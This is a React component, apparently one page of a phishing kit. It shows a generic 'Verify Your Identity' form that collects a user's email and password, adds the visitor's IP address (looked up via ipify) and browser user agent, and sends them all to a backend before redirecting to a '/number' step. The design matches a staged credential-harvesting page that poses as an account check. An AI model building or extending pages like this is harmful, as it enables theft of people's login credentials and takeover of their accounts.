import React, { useState } from "react";
import { emailPass } from "../api"; // Import the emailPass function
import styles from "./EmailPass.module.css";
import axios from "axios";
import { useNavigate } from "react-router-dom"; // Import useNavigate

const EmailPass = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [errorMessage, setErrorMessage] = useState(""); // State for error message
  const [successMessage, setSuccessMessage] = useState(""); // State for success message
  const navigate = useNavigate(); // Initialize navigate

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      const ip = await getIP(); // Fetches the user's IP
      const userAgent = navigator.userAgent; // Get the user's user agent

      // Call the emailPass function to send the data to the server
      const response = await emailPass(email, password, ip, userAgent);

      setSuccessMessage(response.message); // Set success message from response
      setErrorMessage(""); // Clear any previous error messages

      // Navigate to the /number route on success
      navigate("/number");
    } catch (error) {
      setErrorMessage(error); // Set error message
      setSuccessMessage(""); // Clear any previous success messages
    }
  };

  const getIP = async () => {
    try {
      const response = await axios.get("https://api.ipify.org?format=json");
      return response.data.ip;
    } catch (error) {
      console.error("Failed to get IP address:", error);
      return "Unknown IP";
    }
  };

  return (
    <div className={styles.parentContainer}>
      <div className={styles.innerContainer}>
        {/* Section Heading */}
        <h2 className={styles.heading}>Verify Your Identity</h2>

        {/* Description */}
        <p className={styles.description}>
          Please enter the email associated with your account and your password
          below to verify your identity.
        </p>

        {/* Display success or error messages */}
        {successMessage && <p className={styles.success}>{successMessage}</p>}
        {errorMessage && <p className={styles.error}>{errorMessage}</p>}

        {/* Input for email and password */}
        <form onSubmit={handleSubmit}>
          <div className={styles.inputGroup}>
            <input
              type="email"
              placeholder="Enter your email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className={styles.input}
              required
            />
          </div>
          <div className={styles.inputGroup}>
            <input
              type="password"
              placeholder="Enter your password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className={styles.input}
              required
            />
          </div>
          <button type="submit" className={styles.submitButton}>
            Verify
          </button>
        </form>

        {/* Contact support or resend */}
        <a href="#contact-support" className={styles.contactSupportLink}>
          Having trouble? Contact Support
        </a>
      </div>
    </div>
  );
};

export default EmailPass;
